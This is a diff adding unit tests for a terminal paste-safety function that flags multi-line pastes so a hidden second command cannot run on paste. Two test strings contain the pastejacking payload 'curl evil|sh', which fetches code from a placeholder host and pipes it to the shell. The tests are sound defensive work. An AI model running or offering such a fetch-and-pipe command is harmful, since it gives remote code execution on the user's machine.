@@ -465,6 +465,18 @@ eq(S.paste_findings(CAFE), (True, False), 'findings unicode')
 eq(S.paste_findings('a' + BEL + 'b'), (False, True), 'findings control')
 eq(S.paste_findings('a' + BIDI + NUL), (True, True), 'findings both')
 
+# --- paste_is_multiline (F3): a multi-line paste is held for review even when pure
+# ASCII, so a hidden second command cannot run the instant you paste ---------------
+eq(S.paste_is_multiline(''), False, 'multiline: empty is not multi-line')
+eq(S.paste_is_multiline('ls'), False, 'multiline: a single line is not multi-line')
+eq(S.paste_is_multiline('ls\n'), False,
+   'multiline: a single line with a trailing newline is one command, not multi-line')
+eq(S.paste_is_multiline('a\nb'), True, 'multiline: two lines are multi-line')
+eq(S.paste_is_multiline('echo ok\rcurl evil|sh'), True,
+   'multiline: an interior carriage return (which the shell runs) is multi-line')
+eq(S.paste_is_multiline('echo ok\ncurl evil|sh\n'), True,
+   'multiline: a pastejacking payload is multi-line (held for review)')
+
 # --- colours: environment gate (NO_COLOR only, NOT the launch TERM) -----------
 saved_env = {k: os.environ.get(k) for k in ('NO_COLOR', 'TERM', 'COLORTERM')}
 try:
